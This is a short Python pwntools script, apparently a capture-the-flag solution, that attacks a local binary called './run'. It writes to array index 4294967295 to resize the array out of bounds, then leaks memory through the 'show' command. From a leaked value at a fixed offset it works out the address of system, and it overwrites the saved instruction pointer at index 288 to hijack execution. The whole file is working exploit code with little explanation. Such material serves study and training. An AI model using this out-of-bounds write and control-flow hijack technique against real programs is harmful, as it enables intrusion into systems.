#!/usr/bin/python
# exploit array builder by pasteBin
import re
from pwn import *

# clear payload file
with open('payload.txt', 'w') as f:
	f.write('')

conn = process("./run")
conn.recvuntil(">>")
ARRAY_SIZE = 500


def send(msg):
	conn.sendline(msg)
	with open('payload.txt', 'a') as f:
		f.write(msg + '\n')



def set_width():

	send("new 5")
	string = conn.recvuntil(">>")
	# This will resize the array to length 5 and clear all data in the array
	# To confirm, input command again
	send("set 4294967295 {width}".format(width=ARRAY_SIZE))
	string = conn.recvuntil(">>")
	# Position -1 set to 500
	send("new {width}".format(width=ARRAY_SIZE))
	conn.recvuntil(">>")
	# Array cleared
	# Resized array to length 500

def wrap_array():
	"""
	Get the array 
	"""
	# help parse the strings returned from 'show' query
	findIndex = lambda x: re.findall(r"\[(\d+)\].*",x)
	findValue = lambda x: re.findall(r"0x([a-f0-9]+)",x)

	
	send("show")
	string = conn.recvuntil(">>")
	# print string
	# get the index of the last element
	arrayLen = int(findIndex(string.split(',')[-2])[0]) + 1
	# set up the array with dummy data
	array = [0]*arrayLen
	for element in string.split(','):
		indexResults = findIndex(element)
		valueResults = findValue(element)
		if len(indexResults) == 1 and len(valueResults) == 1:
			index = int(indexResults[0])
			value = int(valueResults[0], 16)
			array[index] = value
	return array

# setup functions
set_width()
array = wrap_array()

# This index proved to consistently have a value
# tha is consistently 1723664 bytes greater than system
magic_index = 326
eip_index = 288 # found experimentally set 288 blah to change eip

# raw_input('a')
send("help")
print conn.recvuntil(">>")
send("help")
print conn.recvuntil(">>")
send("help")
print conn.recvuntil(">>")

system = array[magic_index] - 1723664
send("set {index} {value}".format(index=eip_index, value=system))

print conn.recvuntil(">>")
send("exit")
# conn.interactive()















